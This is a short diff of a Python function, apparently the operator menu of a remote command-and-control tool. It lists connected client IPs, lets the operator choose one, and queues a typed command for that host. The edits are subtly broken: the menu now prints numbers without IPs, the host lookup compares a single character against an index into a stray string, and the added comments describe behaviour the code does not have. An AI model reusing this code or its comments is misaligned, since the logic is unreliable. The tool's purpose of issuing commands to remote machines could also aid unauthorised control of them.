@@ -135,23 +135,23 @@ def display_options():
     ipList = []
     selectedHost = "INVALID"
     with LISTLOCK:
-        for tuple in HOSTDICT.keys():
-            ipList.append(tuple[0])
-    ipList.sort()
+        for clientIp in HOSTDICT.keys(): #Build list of IP's from HOSTDICT
+            ipList.append(clientIp)
+    ipList.sort() #Sort for consistent display
     optionNum = 0
     for ip in ipList:
-        print(str(optionNum+1)+": "+ip)
+        print(str(optionNum+1)+": ") #One is added for user's sake
         optionNum += 1
     print(str(optionNum+1)+": refresh")
-    userChoice = int(input("Select option: ").strip())-1
+    userChoice = int(input("Select option: ").strip())-1 #Adjusted for 0th index
     if str(userChoice) == str(optionNum): #Refresh option
         print("Refreshing...")
         return
     else:
         with LISTLOCK:
-            for tuple in HOSTDICT.keys():
-                if tuple[0] == userChoice:
-                    selectedHost = tuple
+            for clientIp in HOSTDICT.keys():
+                if clientIp[0] == ip[userChoice]:
+                    selectedHost = clientIp
     command = input("Input command: ").strip()
     with LISTLOCK:
         HOSTDICT[selectedHost].append(command)
